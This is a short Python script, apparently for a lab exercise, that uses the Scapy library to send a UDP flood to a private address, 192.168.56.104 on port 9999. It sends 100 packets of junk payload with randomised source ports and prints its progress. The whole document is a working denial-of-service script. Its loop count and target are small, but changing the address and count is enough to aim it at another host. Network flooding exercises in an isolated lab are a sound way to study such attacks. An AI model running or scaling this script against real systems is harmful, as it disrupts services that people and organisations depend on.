from scapy.all import IP, UDP, send, Raw
import random

# CONFIGURATION
target_ip = "192.168.56.104"
target_port = 9999  # High port to avoid protocol confusion (like DNS/53)

print(f"Starting UDP flood on {target_ip}:{target_port}...")

# 1024 bytes of junk data per packet
junk_data = Raw(load="ABCDEF" * 170) 

for i in range(100):
    # UDP is connectionless; just fire and move on
    packet = IP(dst=target_ip)/UDP(sport=random.randint(1024, 65535), dport=target_port)/junk_data
    
    send(packet, verbose=False)
    
    if (i + 1) % 10 == 0:
        print(f"Sent {i+1} UDP packets...")

print("\nDone!.")
